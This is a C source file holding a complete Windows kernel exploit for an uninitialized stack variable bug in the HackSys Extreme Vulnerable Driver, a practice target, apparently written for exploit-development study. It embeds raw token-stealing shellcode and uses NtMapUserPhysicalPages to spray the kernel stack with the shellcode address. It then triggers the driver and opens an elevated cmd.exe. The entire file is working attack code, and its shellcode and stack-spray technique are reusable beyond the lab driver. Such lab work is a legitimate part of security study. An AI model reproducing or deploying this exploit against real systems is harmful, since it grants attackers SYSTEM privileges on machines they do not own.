#include "exploit.h"

// This shellcode is heavily based off of Connor McGarr's write-up! Check it out!
// https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/

char shellcode[] =
{
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x88, 0x01, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x8B, 0x80, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0x08, 0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x08, 0x02, 0x00, 0x00, 0xC3
};

int main(int argc, char** argv)
{
	HMODULE h_ntdll = 0;
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	long long* shellcode_address = 0, shellcode_address_spray_can[1024], input_value = 0x012345678;
	unsigned long old_protection = 0;
	char unused = 0;
	void* zero = 0;
	NtMapUserPhysicalPages _NtMapUserPhysicalPages = 0;

	RtlSecureZeroMemory(&shellcode_address_spray_can, sizeof(shellcode_address_spray_can));

	system("title Uninitialized Stack Variable");

	printf("%s[!] Exploit written by ExAllocatePool2.\n[!] Lets exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the HackSys Extreme Vulnerable Driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the HackSys Extreme Vulnerable Driver. Handle Value: 0x%p", h_driver);

	shellcode_address = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!shellcode_address)
	{
		printf("\n[-] Failed to allocate %d bytes of stack memory. Error: %d (0x%x)", (int)sizeof(shellcode), GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated %d bytes of stack memory. Shellcode Allocation Address: 0x%p", (int)sizeof(shellcode), shellcode_address);

	memcpy(shellcode_address, &shellcode, sizeof(shellcode));
	printf("\n[+] Mapped shellcode onto the allocation.");

	h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!h_ntdll)
	{
		printf("\n[-] Failed to load the ntdll.dll API library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Loaded the ntdll.dll API library. Handle Value: 0x%p", h_ntdll);

	_NtMapUserPhysicalPages = (NtMapUserPhysicalPages)GetProcAddress(h_ntdll, "NtMapUserPhysicalPages");
	if (!_NtMapUserPhysicalPages)
	{
		printf("\n[-] Failed to locate the NtMapUserPhysicalPages function routine. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located the NtMapUserPhysicalPages function routine. Function Address: 0x%p", _NtMapUserPhysicalPages);

	for (int i = 0; i < 1024; i++)
	{
		shellcode_address_spray_can[i] = (long long*)shellcode_address;
	}
	printf("\n[+] Prepared the dual-page shellcode address spray.");

	if (!VirtualProtect(&shellcode_address_spray_can, sizeof(shellcode_address_spray_can), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the spray as read+write+executable (RWX). Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the spray as read+write+executable (RWX).\n[!] Pray for no stack trash...");
	Sleep(2000);

	// TODO: Get this to trigger on Windows 7. For some reason, the program simply crashes and nothing actually happens. The spray works, though.
	_NtMapUserPhysicalPages(zero, 1024, &shellcode_address_spray_can);
	DeviceIoControl(h_driver, TARGET_IOCTL, &input_value, 8, 0, 0, 0, 0);
	system("start cmd.exe");
}